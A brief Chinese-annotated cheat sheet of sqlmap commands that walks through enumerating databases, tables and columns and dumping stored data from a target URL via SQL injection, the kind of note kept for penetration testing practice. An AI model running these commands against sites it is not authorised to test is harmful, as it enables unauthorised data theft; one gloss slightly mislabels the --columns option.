sqlmap:
sqlmap -r .txt
sqlmap -u 链接 ：查看数据库类型
sqlmap -u 链接 --dbs ：查看目标存在的数据库
sqlmap -u 目标网址 --tables -D 数据库名：查看指定数据库中存在的表
sqlmap -u 目标网址 --columns -T 表名 -D 数据库名：获取表中内容
sqlmap -u 目标网址 --dump -C 字段名称 -T 表名 -D 数据库名：查看表中存储的内容
